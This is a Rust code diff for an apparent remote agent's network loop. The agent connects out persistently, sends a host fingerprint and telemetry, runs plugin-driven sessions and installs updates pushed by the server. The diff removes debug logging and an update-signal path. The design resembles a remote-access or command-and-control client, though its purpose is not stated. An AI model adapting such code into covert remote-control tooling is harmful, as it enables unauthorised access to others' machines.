@@ -16,85 +16,51 @@ enum SessionOutcome {
 }
 
 pub fn run(ip: &str, port: u16) {
-    run_internal(ip, port, false, None);
-}
-
-pub fn run_with_update_signal(ip: &str, port: u16, signal_port: u16, signal_token: &str) {
-    run_internal(ip, port, true, Some((signal_port, signal_token)));
-}
-
-fn run_internal(ip: &str, port: u16, update_child: bool, update_signal: Option<(u16, &str)>) {
-    eprintln!("[DEBUG][net] phase=start update_child={} ip={} port={}", update_child, ip, port);
     let fp = telemetry::fingerprint();
     let mut plugins = Manager::new();
+    let mut update_failed = false;
 
     loop {
-        eprintln!("[DEBUG][net] phase=connect attempt");
         match TcpStream::connect((ip, port)) {
             Ok(mut stream) => {
-                eprintln!("[DEBUG][net] phase=connect result=OK");
                 let _ = stream.set_read_timeout(Some(Duration::from_secs(text::READ)));
+                if send(&mut stream, &format!("{}{}", text::HELLO, fp)).is_err() {
+                    thread::sleep(Duration::from_secs(text::RETRY));
+                    continue;
+                }
 
-                // Advertise the agent before the slower Windows telemetry probes.
-                let hello_ok = send(&mut stream, &format!("{}{}", text::HELLO, fp)).is_ok();
-                eprintln!("[DEBUG][net] phase=send_hello result={}", hello_ok);
-                if hello_ok {
-                    if update_child {
-                        eprintln!("[DEBUG][net] phase=update_child_signal start");
-                        let Some((signal_port, signal_token)) = update_signal else {
-                            eprintln!("[DEBUG][net] phase=update_child_signal result=FAIL missing signal configuration");
-                            let _ = stream.shutdown(Shutdown::Both);
-                            let _ = sys::release_single();
-                            return;
-                        };
-                        if update::signal_success(signal_port, signal_token).is_err() {
-                            eprintln!("[DEBUG][net] phase=update_child_signal result=FAIL");
-                            let _ = stream.shutdown(Shutdown::Both);
-                            let _ = sys::release_single();
-                            return;
-                        }
-                        eprintln!("[DEBUG][net] phase=update_child_signal result=OK");
+                let host = telemetry::host(&fp);
+                let ping = telemetry::ping_ms(ip);
+                let data = telemetry::record(ip, ping, &fp);
+                if send(&mut stream, &format!("{}{}", text::DATA, data)).is_err() {
+                    thread::sleep(Duration::from_secs(text::RETRY));
+                    continue;
+                }
+                if update_failed {
+                    let _ = send(&mut stream, "ERR:UPDATE:FAILED");
+                    update_failed = false;
+                }
+
+                println!("{}", text::CONNECTED);
+                plugins.event("agent.connected", host.as_bytes());
+                match session(&mut stream, ip, port, &fp, &host, &mut plugins) {
+                    SessionOutcome::Normal => plugins.clear(),
+                    SessionOutcome::Close => {
+                        plugins.clear();
+                        return;
                     }
-
-                    let host = telemetry::host(&fp);
-                    // Keep the connection responsive during startup. The detailed
-                    // Windows probes are individually bounded and are only collected
-                    // for the initial DATA snapshot; the command loop must remain
-                    // reachable even when a probe is slow or unavailable.
-                    let ping = telemetry::ping_ms(ip);
-                    let data = telemetry::record(ip, ping, &fp);
-                    if send(&mut stream, &format!("{}{}", text::DATA, data)).is_ok() {
-                        println!("{}", text::CONNECTED);
-                        plugins.event("agent.connected", host.as_bytes());
-                        match session(&mut stream, ip, port, &fp, &host, &mut plugins) {
-                            SessionOutcome::Normal => {
-                                plugins.clear();
-                            }
-                            SessionOutcome::Close => {
-                                plugins.clear();
-                                return;
-                            }
-                            SessionOutcome::Update(pending) => {
-                                eprintln!("[DEBUG][net] phase=update_session result=UPDATE");
-                                let _ = stream.shutdown(Shutdown::Both);
-                                plugins.clear();
-                                eprintln!("[DEBUG][net] phase=finish_after_disconnect start");
-                                match pending.finish_after_disconnect(ip, port) {
-                                    Ok(()) => {
-                                        eprintln!("[DEBUG][net] phase=finish_after_disconnect result=OK");
-                                        std::process::exit(0)
-                                    },
-                                    Err(err) => {
-                                        eprintln!("[DEBUG][net] phase=finish_after_disconnect result=FAIL error={err}");
-                                        eprintln!("update handoff failed: {err}");
-                                    }
-                                }
-                            }
+                    SessionOutcome::Update(pending) => {
+                        let _ = stream.shutdown(Shutdown::Both);
+                        plugins.clear();
+                        if pending.finish().is_err() {
+                            update_failed = true;
+                        } else {
+                            return;
                         }
                     }
                 }
             }
-            Err(err) => { eprintln!("[DEBUG][net] phase=connect result=FAIL error={err}"); }
+            Err(_) => {}
         }
 
         println!("{}", text::RETRYING);
@@ -145,16 +111,12 @@ fn session(
                         let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE));
                         continue;
                     };
-                    eprintln!("[DEBUG][net] phase=update_prepare start filename={} bytes={}", filename, bytes.len());
-                    match update::prepare(ip, port, filename, &bytes) {
+                    match update::prepare(filename, &bytes) {
                         Ok(pending) => {
-                            eprintln!("[DEBUG][net] phase=update_prepare result=OK target={}", pending.filename());
                             let _ = send(stream, &format!("{}{}{}", text::ACK, text::UPDATE, pending.filename()));
-                            eprintln!("[DEBUG][net] phase=update_ack sent");
                             return SessionOutcome::Update(pending);
                         }
-                        Err(err) => {
-                            eprintln!("update prepare failed: {err}");
+                        Err(_) => {
                             let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE));
                         }
                     }
